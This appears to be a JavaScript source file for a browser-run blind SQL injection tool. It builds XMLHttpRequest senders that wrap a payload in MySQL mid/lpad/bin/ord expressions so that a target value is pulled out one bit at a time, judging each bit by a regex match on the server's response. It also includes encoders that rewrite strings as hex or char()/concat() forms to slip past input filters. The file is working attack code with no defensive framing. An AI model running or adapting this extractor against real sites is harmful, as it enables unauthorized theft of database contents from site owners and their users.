function Sender(name) {
    this.name = name;
    this.xhr = "var xhr = new XMLHttpRequest();";
    this.requestHeaders = [];
}

function RequestSender(injector) {
    this.handler = function() {
        if (this.readyState == 4) {
            var after = new Date();
            console.log('Time Elpased:' + (after-before));
            document.body.innerHTML = this.responseText;
        }
    };

    this.wrapper = "\x22+val+\x22";
    this.arg = "val";
}

RequestSender.prototype = new this.Sender('send');
RequestSender.prototype.constructor = RequestSender;

function SQLSender(injector) {
    var unicode = injector.options.unicode;
    this.handler = function() {
        if (this.readyState == 4) {
            injector.result[i - 1][j - 1] = !!this.responseText.match(injector.pattern) + 0;
        }
    };
    this.arg = "i,j";
    if (typeof unicode == 'undefined') {
        throw ReferenceError(unicode + ' is not defined');
    }
    this.wrapper = 'mid(lpad(bin(ord(mid($wrap,\x22+i+\x22,1))),' + (unicode ? '16' : '8') + ',0),\x22+j+\x22,1)';
}

SQLSender.prototype = new this.Sender('inject');
SQLSender.prototype.constructor = SQLSender;

function Injector(method, url, params, payload, pattern) {
    this.method = method;
    this.isPost = (method.toLowerCase() == 'post');
    if (url[0] == '/') {
        this.url = url;
    } else {
        this.url = location.pathname;
    }
    this.options = {};
    this.options.unicode = false;
    this.result = [];
    this.cursor = 1;
    this.params = params;
    this.pattern = pattern;
    this.payload = this.parseVar(payload);
    this.prepare();
    this.registerFuncs();
}

Injector.prototype.registerSender = function(sender) {
    this.senderList.push(sender);
}

Injector.prototype.execute = function(len) {
    for (var i = this.cursor; i <= this.cursor + len; i++) {
        this.result[i - 1] = [];
        for (var j = 1; j <= (this.options.unicode ? 16 : 8); j++) {
            this.inject(i, j)
        }
    }
    this.cursor = this.cursor + len;
}

Injector.prototype.toString = function() {
    var answer = '';
    for (var i = 0; i < this.result.length; i++) {
        answer += String.fromCharCode(parseInt(this.result[i].join(""), 2))
    }
    return answer;
}

Injector.prototype.prepare = function() {
    var sender;
    var url, params;
    var content;

    this.senderList = [];
    this.registerSender(new RequestSender(this));
    this.registerSender(new SQLSender(this));

    for (var i = 0; i < this.senderList.length; i++) {
        sender = this.senderList[i];
        url = this.url.replace(/\$p/, sender.wrapper).replace(/\$wrap/, this.payload);
        params = this.params.replace(/\$p/, sender.wrapper).replace(/\$wrap/, this.payload);

        content = sender.xhr + '\n';
        content += 'var before = new Date();\n';
        content += sender.initCallback ? 'var initCallback = ' + sender.initCallback +'; initCallback();\n ' : '';
        content += "xhr.open(\x22" + this.method + "\x22, \x22" + url;
        content += this.isPost ? "\x22);" : '?' + params + "\x22);\n";
        content += this.isPost ? "xhr.setRequestHeader(\x22Content-Type\x22,\x22application/x-www-form-urlencoded\x22);" : '';
        content += sender.requestHeaders.join(" ");
        content += this.isPost ? "xhr.send(\x22" + params + "\x22);\n" : "xhr.send(null);\n";
        content += "xhr.onreadystatechange=" + sender.handler + '\n';
        this[sender.name] = new Function(sender.arg, content);
    }
}

Injector.prototype.parseVar = function(str) {
    var flag = true;
    while (flag) {
        flag = false;
        str = str.replace(/(?:{\$)([a-z.]+?)\("?([a-z0-9]+?)"?\)(?:})/, function(m, func, arg) {
            if (typeof func != 'undefined') {
                flag = true;
            }
            return window[func](arg);
        });
    }
    return str;
}

function encode(source, prefix, suffix, radix, before, after) {
    var output = prefix;
    for (var i = 0; i < source.length; i++) {
        output += before + source.charCodeAt(i).toString(radix) + after;
    }
    var last = output.lastIndexOf(after);
    output = output.substr(0, last);
    output += suffix;
    return output;
}

Injector.prototype.registerFuncs = function() {
    var func = {
        'hex':"encode(source, '0x', '', 16, '', '')",
        'concat':"encode(source, 'concat(', '))', 10, 'char(', '),')",
        'char':"encode(source, 'char(', ')', 10, '', ',')",
        'htmlentity':"encode(source, '', ';', 16, '&#x', ';')",
    };
    for(var key in func) {
        window[key] = new Function('source','return '+func[key]);
    }
}

Injector.prototype.setUnicode = function(bool) {
    this.options.unicode = bool;
}

Injector.prototype.timeElapsed = function() {
    return this.after - this.before;
}
